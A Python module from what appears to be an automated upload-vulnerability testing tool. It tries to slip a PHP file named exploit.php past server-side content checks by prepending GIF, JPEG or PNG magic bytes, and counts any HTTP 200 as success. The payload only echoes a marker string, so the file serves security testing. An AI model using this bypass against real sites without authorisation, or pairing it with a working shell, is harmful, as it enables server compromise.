import re
import sys
import os
from typing import Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from strategies.base import Strategy, StrategyStatus
from models.observation import Observation, ObservationType, ConfidenceLevel

class MagicBytesStrategy(Strategy):
    """
    Bypass filters that check file headers (magic bytes)
    """
    
    name = "magic_bytes"
    description = "Bypass file content checks by prepending image magic bytes"
    confidence_gain = 0.75
    
    targets_hypotheses = [
        "content_validation",
        "magic_byte_check"
    ]
    
    def __init__(self, uploader, fetcher, observer, base_url: str):
        self.uploader = uploader
        self.fetcher = fetcher
        self.observer = observer
        self.base_url = base_url.rstrip('/')
        
        self.magic_bytes = {
            "GIF": b"\x47\x49\x46\x38\x39\x61", # GIF89a
            "JPEG": b"\xFF\xD8\xFF\xDB",
            "PNG": b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"
        }
    
    def applicable(self, context) -> bool:
        return True

    def execute(self, context) -> StrategyStatus:
        print("      [*] Testing magic bytes polyglot payload...")
        
        for name, header in self.magic_bytes.items():
            print(f"      [*] Prepending {name} magic bytes...")
            
            filename = "exploit.php"
            payload = header + b" <?php echo 'VULNERABLE'; ?>"
            
            try:
                upload_response = self.uploader.upload(filename, payload)
                
                if upload_response.status_code == 200:
                    print(f"      [+] Upload accepted with {name} magic bytes")
                    return StrategyStatus.SUCCESS
                    
            except Exception as e:
                print(f"      [!] Error: {e}")
                continue
                
        return StrategyStatus.FAILURE
